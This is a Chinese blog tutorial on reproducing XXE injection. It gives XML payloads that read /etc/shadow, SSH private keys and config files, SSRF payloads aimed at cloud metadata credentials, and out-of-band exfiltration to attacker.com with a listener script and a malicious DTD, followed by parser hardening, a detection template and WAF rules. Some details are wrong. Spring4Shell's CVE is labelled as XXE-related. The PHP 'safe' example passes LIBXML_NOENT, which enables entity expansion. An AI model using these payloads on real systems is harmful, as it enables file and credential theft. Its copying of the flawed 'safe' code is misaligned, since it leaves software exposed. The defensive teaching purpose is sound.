---
title: "XXE 注入漏洞复现 - 从原理到实战利用"
date: 2026-03-01T19:00:00+08:00
draft: false
categories: ['漏洞复现']
tags: ['XXE', 'XML', '漏洞复现']
image: "/blog-cover-default.jpg"
---

# XXE 注入漏洞复现 - 从原理到实战利用

## 📋 漏洞概述

**漏洞名称**: XML External Entity (XXE) Injection  
**漏洞类型**: 注入攻击  
**危害等级**: 🔴 高危  
**CVE 编号**: CVE-2022-22965 (Spring4Shell 相关) 等

---

## 🎯 漏洞原理

### 什么是 XXE？

XXE（XML External Entity）注入是一种针对 XML 解析器的攻击方式。当应用程序解析 XML 输入时，如果未正确配置 XML 解析器，攻击者可以通过构造恶意的 XML 实体来：

- 读取服务器文件系统内容
- 探测内网服务
- 执行远程代码
- 发起 DoS 攻击

### 核心机制

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

当 XML 解析器处理上述内容时，`&xxe;` 会被替换为 `/etc/passwd` 文件的内容。

---

## 🧪 漏洞环境搭建

### 目标应用

使用存在 XXE 漏洞的示例应用：

```bash
# 启动漏洞环境
docker run -d -p 8080:8080 vulnerables/web-dvwa
```

### 测试接口

假设目标有一个 XML 数据导入接口：

```http
POST /api/import HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0"?>
<user>
  <name>test</name>
  <email>test@example.com</email>
</user>
```

---

## ⚔️ 漏洞利用

### 1️⃣ 基础文件读取

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@example.com</email>
</user>
```

**响应示例**:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### 2️⃣ 读取敏感配置文件

```xml
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
  <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
```

### 3️⃣ SSRF 内网探测

```xml
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

**云环境利用**: AWS/Aliyun 元数据服务
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 4️⃣ 盲注 XXE (Out-of-Band)

当无法直接看到响应时，使用 OOB 技术：

```xml
<!DOCTYPE user [
  <!ENTITY % payload SYSTEM "file:///etc/passwd">
  <!ENTITY % remote SYSTEM "http://attacker.com/xxe?data=%payload;">
  %remote;
]>
```

**攻击者服务器**:
```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class XXEHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Received XXE data: {self.path}")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 80), XXEHandler).serve_forever()
```

### 5️⃣ 基于 DTD 的 XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE user SYSTEM "http://attacker.com/malicious.dtd">
<user>
  <name>test</name>
</user>
```

**malicious.dtd**:
```dtd
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % remote SYSTEM "http://attacker.com/exfil?%payload;">
%remote;
```

---

## 🛡️ 常见语言利用示例

### Java (DocumentBuilder)

```java
// ❌ 不安全配置
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlData)));

// ✅ 安全配置
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### PHP (SimpleXML)

```php
// ❌ 不安全
$xml = simplexml_load_string($data);

// ✅ 安全
$libxml_previous_state = libxml_disable_entity_loader(true);
$xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT);
libxml_disable_entity_loader($libxml_previous_state);
```

### Python (lxml)

```python
# ❌ 不安全
from lxml import etree
tree = etree.fromstring(xml_data)

# ✅ 安全
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.fromstring(xml_data, parser)
```

---

## 🔍 漏洞检测

### Nuclei 模板

```yaml
id: xxe-detection
info:
  name: XXE Injection Detection
  severity: high
  tags: xxe,injection

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/import"
    headers:
      Content-Type: application/xml
    body: |
      <?xml version="1.0"?>
      <!DOCTYPE foo [<!ENTITY xxe "XXE_TEST">]>
      <root>&xxe;</root>
    matchers:
      - type: word
        words:
          - "XXE_TEST"
```

### Burp Suite 测试

1. 拦截 XML 请求
2. 发送至 Repeater
3. 添加 DOCTYPE 实体声明
4. 观察响应变化

---

## 📊 真实案例分析

### 案例 1: 某电商平台用户信息泄露

**漏洞点**: 订单导入接口  
**利用方式**: 读取 `/etc/passwd` + 数据库配置文件  
**影响**: 50 万 + 用户数据泄露

### 案例 2: 云服务 SSRF

**漏洞点**: XML-RPC 接口  
**利用方式**: 访问 AWS 元数据服务  
**影响**: 获取 IAM 凭证，接管云资源

---

## ✅ 防御方案

### 1. 禁用外部实体

所有语言都应禁用 DTD 和外部实体解析。

### 2. 使用安全解析器

```java
// Java 推荐配置
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

### 3. 输入验证

- 限制 XML 输入大小
- 白名单验证 XML 结构
- 过滤 DOCTYPE 声明

### 4. WAF 规则

```
SecRule REQUEST_BODY "@rx <!DOCTYPE" "id:1,deny,msg:'XXE Attempt'"
SecRule REQUEST_BODY "@rx SYSTEM.*file://" "id:2,deny,msg:'XXE File Access'"
```

---

## 🎓 学习资源

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger XXE Labs](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

**标签**: #XXE #注入漏洞 #Web 安全 #漏洞复现 #SRC
